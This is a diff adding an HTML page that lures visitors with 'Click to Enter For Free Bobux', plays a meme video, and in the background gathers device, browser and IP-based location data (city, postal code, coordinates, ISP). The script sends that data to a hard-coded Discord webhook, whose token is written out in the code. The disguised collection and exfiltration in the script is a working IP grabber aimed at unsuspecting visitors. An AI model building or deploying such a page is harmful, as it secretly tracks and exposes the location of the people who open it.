@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>My Black Screen</title>
+    <link rel="stylesheet" href="css.css">
+    <style>
+        /* CSS for the black screen */
+        .black-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: black;
+            color: white;
+            font-size: 19px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+            font-family: "Lexend", sans-serif;
+        }
+        
+        /* CSS for the video */
+        #KanyeWest {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw; /* Adjusted width */
+            height: 100vh; /* Adjusted height */
+            object-fit: cover; /* Ensures the video covers the entire container */
+            display: none; /* Initially hide the video */
+        }
+
+        .information {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: white;
+            font-size: 18px;
+            font-family: "Lexend", sans-serif;
+            font-optical-sizing: auto;
+            z-index: 1;
+            display: none; /* Initially hide the information */
+            animation: fadeIn 0.5s ease forwards; /* Apply fade-in animation */
+            white-space: pre-line; 
+            text-align: center;
+            text-shadow: 1px 1px 2px black;
+        }
+
+        /* Animation for fading in the information block */
+        @keyframes fadeIn {
+            0% {
+                opacity: 0;
+            }
+            100% {
+                opacity: 1;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="black-screen" onclick="startVideoOnExplicitClick()">Click to Enter For Free Bobux🤑</div>
+    <video id="KanyeWest" muted loop>
+        <source src="kurt angle meme template.mp4" type="video/mp4">
+    </video>
+    <div class="information"></div>
+
+    <script>
+        const video = document.getElementById("KanyeWest");
+        const blackScreen = document.querySelector('.black-screen');
+        const information = document.querySelector('.information');
+
+        function startVideoOnExplicitClick() {
+            if (!video.paused) return; // Exit if video is already playing
+            video.style.display = 'block'; // Show the video
+            video.play(); // Start playing the video
+            blackScreen.style.display = 'none'; // Hide the black screen
+            information.style.display = 'block'; // Show the information
+            getSystemInfo(); // Fetch and display system information
+        }
+
+        video.addEventListener('pause', function() {
+            blackScreen.style.display = 'block';
+            information.style.display = 'none'; // Hide the information
+        });
+
+        function getSystemInfo() {
+            // Get device information
+            const deviceInfo = `
+                Device: ${navigator.vendor}<br>Platform: ${navigator.platform}<br>GPU Vendor: ${navigator.userAgent}<br>Screen Width: ${window.screen.width}<br>Screen Height: ${window.screen.height}<br>Screen Rotation: ${window.screen.orientation.angle || 'Not supported'}<br>Screen Orientation: ${window.screen.orientation.type || 'Not supported'}<br>Display Pixel Depth: ${window.screen.pixelDepth}<br>Window Width: ${window.innerWidth}<br>Window Height: ${window.innerHeight}<br>GPU: ${navigator.gpu}<br>
+            `;
+
+            // Get browser information
+            const browserInfo = `Browser: ${navigator.appName}<br>Browser Version: ${navigator.appVersion}<br>Browser Memory: ${navigator.deviceMemory || 'Not supported'}GB<br>CPU Threads: ${navigator.hardwareConcurrency || 'Not supported'}<br>Browser Language: ${navigator.language}<br>Referrer: ${document.referrer || 'Direct'}<br>Mobile/Tablet: ${navigator.userAgent.match(/(Mobile|Tablet)/i) ? 'Yes' : 'No'}<br>Browser Version: ${navigator.userAgent.match(/(?:MSIE |Trident\/.*; rv:|Edge\/)(\d+)/) ? RegExp.$1 : navigator.userAgent.match(/Chrome\/(\d+)/) ? 'Chrome ' + RegExp.$1 : navigator.userAgent.match(/Firefox\/(\d+)/) ? 'Firefox ' + RegExp.$1 : navigator.userAgent.match(/Version\/(\d+)/) ? 'Safari ' + RegExp.$1 : 'Other'}<br>Platform Name: ${navigator.platform}<br>Browser Name: ${navigator.userAgent.match(/(Chrome|Safari|Firefox|Edge|MSIE|Trident)/i) ? RegExp.$1 : 'Other'}<br>
+            `;
+
+            // Get IP address information
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    fetch(`https://ipapi.co/${data.ip}/json/`)
+                        .then(response => response.json())
+                        .then(ipData => {
+                            const ipInfo = `
+                            IP Address: ${data.ip}<br>Country: ${ipData.country_name}<br>Region: ${ipData.region}<br>Country Code: ${ipData.country_code}<br>Continent Code: ${ipData.continent_code}<br>City: ${ipData.city}<br>ZIP/Postal Code: ${ipData.postal}<br>Latitude: ${ipData.latitude}<br>Longitude: ${ipData.longitude}<br>Timezone: ${ipData.timezone}<br>ISP: ${ipData.org}<br>
+                            `;
+
+                            // Display all information
+                            information.innerHTML = deviceInfo + browserInfo + ipInfo;
+                            // Send information to Discord
+                            sendToDiscord(information.innerHTML);
+                        })
+                        .catch(error => {
+                            console.error("Error fetching IP address information:", error);
+                        });
+                })
+                .catch(error => {
+                    console.error("Error fetching IP address:", error);
+                });
+        }
+
+        function sendToDiscord(message) {
+            // Your Discord API endpoint
+            const discordApiEndpoint = 'https://discord.com/api/webhooks/1231387717686792322/ItTuXtWgCfrDdCPVaztnHEgTNbIA9tkqt1eT-MYJV50BNl5SfXjDcq4PpW1IfgTJp7vA';
+
+            // Construct the request body
+            const requestBody = {
+                content: message
+            };
+
+            // Make a POST request to your Discord API endpoint
+            fetch(discordApiEndpoint, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(requestBody)
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Failed to send message to Discord');
+                }
+                console.log('Message sent to Discord successfully');
+            })
+            .catch(error => {
+                console.error('Error sending message to Discord:', error);
+            });
+        }
+    </script>
+    <script src="js.js"></script>
+    <body oncontextmenu="return false;"></body>
+
+</body>
+</html>
